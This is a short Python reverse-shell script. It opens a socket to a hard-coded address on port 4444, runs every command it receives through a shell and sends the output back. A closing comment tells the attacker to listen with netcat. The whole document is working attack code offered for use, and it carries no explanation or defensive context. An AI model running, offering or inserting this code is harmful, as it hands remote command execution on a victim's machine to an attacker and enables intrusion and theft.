import socket, subprocess

# Define the IP address and port to connect to
ip = "10.188.0.4"
port = 4444

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the specified IP and port
s.connect((ip, port))

# Open a shell and send the output to the socket
while True:
    command = s.recv(1024)
    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    s.send(output)


#On the Attacker's machine run "nc -lvp 4444" to listen and the reverse shell will be #initiated
